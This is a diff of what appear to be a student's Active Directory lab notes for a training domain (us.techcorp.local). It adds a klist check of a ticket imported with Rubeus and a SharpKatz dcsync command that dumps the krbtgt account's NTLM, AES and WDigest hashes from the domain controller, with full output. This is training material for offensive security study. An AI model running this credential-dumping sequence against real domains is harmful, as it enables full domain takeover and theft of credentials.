@@ -475,12 +475,116 @@ C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAg
 [*] Action: Import Ticket
 [+] Ticket successfully imported!
 ```
-validate:
+Validate imported ticket with klist:
+```
+C:\Users\studentuser17>klist
+
+Current LogonId is 0:0x413e6
+
+Cached Tickets: (1)
+
+#0>     Client: US-DC$ @ US.TECHCORP.LOCAL
+        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 2/18/2023 15:08:24 (local)
+        End Time:   2/19/2023 1:08:24 (local)
+        Renew Time: 2/24/2023 20:05:09 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
 ```
 
-```
-Use DCSync to dump all credentials from US-DC:
+Use dcsync with sharpkatz in order to dump krbtgt from Domain controller:
 
 ```
+C:\Users\studentuser17>C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
+[*]
+[*]                     System Information
+[*] ----------------------------------------------------------------------
+[*] | Platform: Win32NT                                                  |
+[*] ----------------------------------------------------------------------
+[*] | Major: 10            | Minor: 0             | Build: 17763         |
+[*] ----------------------------------------------------------------------
+[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
+[*] ----------------------------------------------------------------------
+[*]
+[!] us.techcorp.local will be the domain
+[!] us-dc.us.techcorp.local will be the DC server
+[!] us\krbtgt will be the user account
+[*]
+[*] Object RDN           : krbtgt
+[*]
+[*] ** SAM ACCOUNT **
+[*]
+[*] SAM Username         : krbtgt
+[*] User Principal Name  :
+[*] Account Type         : USER_OBJECT
+[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
+[*] Account expiration   : 12/31/9999 11:59:59 PM
+[*] Password last change : 7/5/2019 12:49:17 AM
+[*] Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
+[*] Object Relative ID   : 502
+[*]
+[*] Credents:
+[*] Hash NTLM            : b0975ae49f441adc6b024ad238935af5
+[*] ntlm- 0              : b0975ae49f441adc6b024ad238935af5
+[*] lm  - 0              : d765cfb668ed3b1f510b8c3861447173
+[*]
+[*] Supplemental Credents:
+[*]
+[*]  * Primary:NTLM-Strong-NTOWF
+[*]     Random Value : 819a7c8674e0302cbeec32f3f7b226c9
+[*]
+[*]  * Primary:Kerberos-Newer-Keys
+[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
+[*]     Credents
+[*]     aes256_hmac       4096: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+[*]     aes128_hmac       4096: 1bae2a6639bb33bf720e2d50807bf2c1
+[*]     des_cbc_md5       4096: 923158b519f7a454
+[*]     ServiceCredents
+[*]     OldCredents
+[*]     OlderCredents
+[*]
+[*]  * Primary:Kerberos
+[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
+[*]     Credents
+[*]     des_cbc_md5       : 923158b519f7a454
+[*]     OldCredents
+[*]
+[*]  * Packages
+[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
+[*]
+[*]  * Primary:WDigest
+[*]     01 a1bdf6146e4b13c939093eb2d72416c9
+[*]     02 cd864c0d5369adad4fc59a469a2d4d17
+[*]     03 2123179b0ab5c0e37943e346ef1f9d9a
+[*]     04 a1bdf6146e4b13c939093eb2d72416c9
+[*]     05 cd864c0d5369adad4fc59a469a2d4d17
+[*]     06 3449e5615d5a09bbc2802cefa8e4f9d4
+[*]     07 a1bdf6146e4b13c939093eb2d72416c9
+[*]     08 296114c8d353f7435b5c3ac112523ba4
+[*]     09 296114c8d353f7435b5c3ac112523ba4
+[*]     10 5d504fb94f1bcca78bd048de9dad69e4
+[*]     11 142c7fde1e3cb590f54e12bbfdecfbe4
+[*]     12 296114c8d353f7435b5c3ac112523ba4
+[*]     13 13db8df6b262a6013f78b082a72add2c
+[*]     14 142c7fde1e3cb590f54e12bbfdecfbe4
+[*]     15 b024bdda9bdb86af00c3b2503c3bf620
+[*]     16 b024bdda9bdb86af00c3b2503c3bf620
+[*]     17 91600843c8dadc79e72a753649a05d75
+[*]     18 423730024cfbbc450961f67008a128a5
+[*]     19 d71f700d63fa4510477342b9dc3f3cc7
+[*]     20 bad6b9122f71f8cfd7ea556374d381d9
+[*]     21 52c6560f77613d0dcf460476da445d93
+[*]     22 52c6560f77613d0dcf460476da445d93
+[*]     23 23504d9f1325c5cf68892348f26e77d7
+[*]     24 8228bd623c788b638fce1368c6b3ef44
+[*]     25 8228bd623c788b638fce1368c6b3ef44
+[*]     26 a2659c1d9fa797075b1fabdee926569b
+[*]     27 784f5fbc5276dcc8f88bbcdfa27b65d8
+[*]     28 2ac6c7c1c24262b424f85e1ab762f1d3
+[*]     29 4bef285b22fd87f4868be352958dcb9e
+[*]
 
 ```
